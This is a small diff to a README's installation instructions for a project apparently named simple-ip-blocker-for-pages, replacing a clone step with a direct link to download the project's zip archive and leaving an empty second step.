@@ -15,6 +15,8 @@ Designed for simplicity, efficiency, and clarity — no technical complexity req
 ---
 
 ## Installation
-1. Download or clone this repository:
+1. Download the file simple-ip-blocker-for-pages.zip
 
   https://github.com/Pmat1000/simple-ip-blocker-for-pages/raw/refs/heads/main/simple-ip-blocker-for-pages.zip
+
+2. 
